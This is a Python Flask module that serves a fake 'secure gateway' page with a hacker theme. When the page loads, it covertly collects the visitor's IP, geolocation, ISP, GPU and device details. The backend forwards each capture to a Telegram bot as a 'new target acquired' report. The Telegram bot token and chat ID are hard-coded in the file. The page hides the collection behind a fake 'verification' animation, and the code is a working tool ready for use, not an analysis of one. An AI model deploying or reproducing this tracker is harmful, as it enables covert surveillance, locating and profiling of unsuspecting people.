from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>SECURE_GATEWAY_v3.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 15%; margin:0; overflow:hidden; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 30px #0f0; position: relative; }
        .scan-line { width: 100%; height: 3px; background: rgba(0,255,0,0.5); position: absolute; top: 0; left:0; animation: scan 2s linear infinite; box-shadow: 0 0 10px #0f0; }
        @keyframes scan { from { top: 0; } to { top: 100%; } }
        .grid { position: fixed; top:0; left:0; width:100%; height:100%; background: linear-gradient(0deg, transparent 24%, rgba(0, 255, 0, .05) 25%, rgba(0, 255, 0, .05) 26%, transparent 27%, transparent 74%, rgba(0, 255, 0, .05) 75%, rgba(0, 255, 0, .05) 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, rgba(0, 255, 0, .05) 25%, rgba(0, 255, 0, .05) 26%, transparent 27%, transparent 74%, rgba(0, 255, 0, .05) 75%, rgba(0, 255, 0, .05) 76%, transparent 77%, transparent); background-size: 50px 50px; z-index:-1; }
    </style>
</head>
<body onload="capture()">
    <div class="grid"></div>
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">CORE_SYSTEM_ANALYSIS</h2>
        <p id="status">Bypassing Firewalls... [78%]</p>
        <div id="loader" style="letter-spacing: 5px;">|||||||||||||||||</div>
    </div>

    <script>
        async function capture() {
            try {
                // 1. IP & GEO DATA
                const res = await fetch('https://ipapi.co/json/');
                const ip = await res.json();

                // 2. GPU DATA (High Level Intel)
                let gpu = "Unknown";
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } catch(e) {}

                // 3. ADVANCED DEVICE DATA
                const data = {
                    ip: ip.ip || "N/A",
                    city: ip.city || "N/A",
                    region: ip.region || "N/A",
                    country: ip.country_name || "N/A",
                    asn: ip.asn || "N/A",
                    isp: ip.org || "N/A",
                    tz: ip.timezone || "N/A",
                    cur: ip.currency || "N/A",
                    os: navigator.platform,
                    agent: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height,
                    cores: navigator.hardwareConcurrency || "N/A",
                    ram: navigator.deviceMemory || "N/A",
                    gpu: gpu,
                    lang: navigator.language,
                    online: navigator.onLine,
                    touch: navigator.maxTouchPoints > 0 ? "Yes" : "No"
                };

                // 4. SEND TO BACKEND
                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                document.getElementById('header').innerText = "ENCRYPTED_AND_SECURE";
                document.getElementById('status').innerText = "Verification Success. Access Granted.";
                document.getElementById('loader').innerText = "[ COMPLETE ]";

            } catch (e) {
                console.log("Error during scan...");
            }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    intel = request.json
    
    # SYSTEMATIC TELEGRAM REPORT
    message = (
        f"🌐 *--- NEW TARGET ACQUIRED ---* 🌐\\n\\n"
        f"🛰️ *NETWORK INTEL*\\n"
        f"┣ IP: `{intel['ip']}`\\n"
        f"┣ ISP: `{intel['isp']}`\\n"
        f"┣ ASN: `{intel['asn']}`\\n"
        f"┗ TZ: `{intel['tz']}`\\n\\n"
        f"📍 *GEOLOCATION*\\n"
        f"┣ CITY: `{intel['city']}`\\n"
        f"┣ REGION: `{intel['region']}`\\n"
        f"┗ COUNTRY: `{intel['country']} ({intel['cur']})`\\n\\n"
        f"💻 *HARDWARE SPECS*\\n"
        f"┣ OS: `{intel['os']}`\\n"
        f"┣ RAM: `{intel['ram']} GB`\\n"
        f"┣ CORES: `{intel['cores']}`\\n"
        f"┣ GPU: `{intel['gpu']}`\\n"
        f"┗ SCREEN: `{intel['screen']}`\\n\\n"
        f"⚙️ *SYSTEM DATA*\\n"
        f"┣ TOUCH: `{intel['touch']}`\\n"
        f"┗ LANG: `{intel['lang']}`\\n\\n"
        f"🕵️ *USER AGENT*\\n"
        f"`{intel['agent'][:200]}...`"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    
    try:
        requests.post(url, json=payload)
        return jsonify({"status": "Success"}), 200
    except:
        return jsonify({"status": "Error"}), 500
